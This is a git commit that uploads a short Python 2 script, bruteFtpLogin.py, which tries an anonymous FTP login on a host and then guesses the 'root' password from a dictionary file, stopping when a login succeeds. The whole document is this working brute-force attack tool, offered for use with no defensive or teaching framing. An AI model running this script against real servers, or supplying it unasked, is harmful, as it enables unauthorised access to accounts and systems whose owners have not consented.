fbf04e42e4d0d3d47bf6816b3f252763311da0cb
pr0d33p <bhattaraipradeep98@gmail.com>
2017-11-25 08:33:12 +0545

    Add files via upload

---
+++ bruteFtpLogin.py
@@ -0,0 +1,35 @@
+import ftplib
+def connect(host,user,password):
+        try:
+                ftp = ftplib.FTP(host)
+                ftp.login(user,password)
+                ftp.quit()
+                return True
+        except:
+                return False
+
+def main():
+        Hostname = '127.0.0.1' # Host to be given here
+        username = 'root' # FTP username here
+        passwordspath = 'passwords.txt' # Dictionary file for bruteforcing
+        
+        print '[+] Using anonymous credentials for ' + Hostname
+        if connect(Hostname,'anonymous','test@solo.nepal') :
+                print '[+] FTP Anonymous logon succeeded on host : ' + Hostname
+        else:
+                print '[-] FTP Anonymous logon failed on host : ' + Hostname
+             
+                passwordsFile = open(passwordspath)
+        with open(passwordspath,'r') as f:
+                for line in f:
+                        password = str(line.replace('\r',''))
+                        print "Testing: " + password
+                        if connect(Hostname,username,password):
+                                # Password Found
+                                print "[+] FTP Logon succeeded on host : " + Hostname + "  using username :  " + username + " and password :  " + password
+                                exit(0)
+                        else:
+                                # Password not found
+                                print "[-] FTP Logon failed on host : " + Hostname + " using username :  " + username + " and password :  " + password
+if __name__ ==  "__main__":
+        main()
